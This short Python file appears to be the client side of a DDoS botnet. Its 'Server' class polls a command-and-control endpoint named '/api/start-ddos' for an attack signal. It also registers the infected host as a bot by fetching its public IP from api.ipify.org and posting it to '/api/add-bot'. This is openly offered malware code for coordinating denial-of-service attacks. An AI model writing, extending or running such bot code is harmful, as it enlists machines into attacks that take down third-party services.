import json
import time
import datetime
import requests


class Server:
    def __init__(self):
        self.ip = 'http://127.0.0.1:5000'
        self.last_request = 0
        self.last_answer = {'start': False}

    def is_attack(self):
        if self.last_request == 0:
            self.last_request = time.time()
            return json.loads(
                requests.get(f'{self.ip}/api/start-ddos').text)
        else:
            if time.time() - self.last_request > 4:
                self.last_answer = json.loads(
                    requests.get(f'{self.ip}/api/start-ddos').text)
                return self.last_answer
            else:
                return self.last_answer

    def login_as_bot(self):
        ip = requests.get('https://api.ipify.org').text
        login_date = datetime.datetime.now()
        requests.post(f'{self.ip}/api/add-bot',
                      json={'ip': ip, 'login-date': login_date})
